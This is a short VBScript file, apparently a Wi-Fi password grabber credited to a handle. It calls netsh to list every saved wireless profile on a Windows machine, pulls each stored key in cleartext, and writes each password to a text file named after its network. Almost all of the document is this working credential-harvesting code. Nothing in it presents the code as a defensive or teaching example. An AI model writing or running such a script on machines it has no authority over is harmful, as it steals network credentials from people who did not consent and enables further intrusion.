'//////////////////////////////////////////////
'//            ε013 V 2.0 (Classic)
'//          Jordan Dalcq - 0v3rl0w
'/////////////////////////////////////////////

Function GetOutput(command)
  Set Shell = Wscript.CreateObject("WScript.Shell")
  Set cmd = Shell.Exec("cmd /c  " & command)
  strOut = ""

  Do While Not cmd.StdOut.AtEndOfStream
    strOut = strOut & cmd.StdOut.ReadLine() & "\n"
  Loop
  GetOutput=strOut
End Function

Function saveIt(wifi, passwd)
  wifi = Replace(Replace(wifi, ">", "-"), "<", "-")
  Set objFSO=CreateObject("Scripting.FileSystemObject")
  Set objFile=objFSO.CreateTextFile(wifi & ".txt")
  objFile.Write(passwd)
  objFile.Close
End Function

strText=Split(GetOutput("netsh wlan show profile"), "\n")

i = 0

For Each x in strText 
	If i > 8 And i < Ubound(strText)-1 Then
		Name = Split(x, ": ")(1)
		str=Split(GetOutput("netsh wlan show profile """ & Name & """ key=clear"), "\n")(32)
		passwd = Split(str, ": ")
		If Ubound(passwd) Then 
			saveIt Name, passwd(1)
		End If
	End If
	i = i + 1
Next
